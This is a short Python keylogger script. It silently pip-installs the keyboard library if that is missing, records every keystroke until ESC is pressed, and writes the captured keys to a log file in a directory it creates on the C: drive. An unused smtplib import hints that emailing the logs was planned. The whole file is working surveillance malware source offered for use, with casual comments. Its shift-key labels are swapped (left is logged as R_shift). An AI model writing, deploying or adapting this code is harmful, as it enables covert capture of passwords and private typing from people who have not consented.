import time
from sys import exit
import os
import smtplib
try:
	import keyboard
except:
	os.system('pip install keyboard')
	exit(0)

keys=[]
patha='C:\\narosna\\log.txt' #Please change the path or dont wtv

if os.path.exists('c:\\narosna') == False:
	os.system('mkdir C:\\narosna') #You know what to do here
def key(event):
	if (event.event_type == 'down'):
		keys.append(event.name)

keyboard.hook(key)
keyboard.wait(combination='escape') # Until here this will record every keystroke until the ESC key is pressed

file = open(patha, 'w')
for i, v in enumerate(keys): keys[i] = v.replace('space', ' ')
for i, v in enumerate(keys): keys[i] = v.replace('left shift', ' R_shift')
for i, v in enumerate(keys): keys[i] = v.replace('right shift', ' L_shift')
for i, v in enumerate(keys): keys[i] = v.replace('back', '+backspace+')
for i, v in enumerate(keys): keys[i] = v.replace('enter', '\n')
# Just arranged the characters a lil bit

str1=''.join(str(e)for e in keys) # Convert list to string
file.write(str1)
file.close()
